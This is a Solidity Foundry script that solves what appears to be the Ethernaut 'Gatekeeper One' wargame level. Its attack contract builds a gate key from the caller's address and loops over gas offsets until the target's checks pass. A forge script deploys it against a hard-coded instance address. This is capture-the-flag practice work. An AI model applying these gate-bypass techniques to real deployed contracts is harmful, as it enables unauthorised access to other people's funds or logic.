// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


import {Script, console} from "forge-std/Script.sol";

interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperOneAttack {
    
    function attack(address target) external {
        bytes8 key = craftKey();
        for (uint256 i = 0; i < 300; i++)
        {
            (bool success, ) = address(target).call{gas: 8191 * 10 + i}
            (abi.encodeWithSignature("enter(bytes8)", key));
            if (success){
                break;
            }
        }
        // IGatekeeperOne(target).enter(key);
    }
    
    function craftKey() public view returns (bytes8) {
        uint16 addressLast16 = uint16(uint160(tx.origin));
        uint64 key64 = uint64(addressLast16);  // bits 0-15 wallet addres, bits 16-31 already zero
        key64 = key64 | (uint64(0x1) << 32);   // bits 32-63 -> set bit 32 to 1
        return bytes8(key64);
    }
    function viewKey() external view returns (bytes8) {
        return craftKey();
    }
}

contract GatekeeperOneSolution is Script {
    function run() external
    {
        address instance = 0xd99Ee1F4A3130E9ac934eB37C0D792851b92a35c;

        vm.startBroadcast();
        GatekeeperOneAttack attacker = new GatekeeperOneAttack();
        // console.log("key:");
        // console.logBytes8(attacker.viewKey());
        // might need to run a few times for gate 2 gas condition
        attacker.attack(instance);
        vm.stopBroadcast();
    }
}



// to craft key
//Split the 64-bit into 2 chunks
// The first 16 bits of the first chunk must equal the last 16 bits of my wallet address
// The last 16 bits of the first chunk must be zero
// The first 16 bits of the second chunk must not be zero